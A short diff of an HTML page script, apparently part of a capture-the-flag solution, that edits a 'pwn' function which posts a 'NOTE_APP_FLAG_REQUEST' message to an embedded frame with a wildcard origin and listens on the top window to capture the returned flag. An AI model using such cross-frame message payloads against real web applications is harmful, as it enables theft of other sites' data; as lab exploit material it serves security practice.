@@ -4,10 +4,10 @@
     <script>
         function pwn() {
           console.log("About to post message")
-          hehe.contentWindow.postMessage("NOTE_APP_FLAG_REQUEST", "*");
+          window.top.hehe.contentWindow.postMessage("NOTE_APP_FLAG_REQUEST", "*");
           console.log("message posted");
        }
-       window.addEventListener("message", (event) => {
+       window.top.addEventListener("message", (event) => {
           console.log(event.data);
        });
     </script>
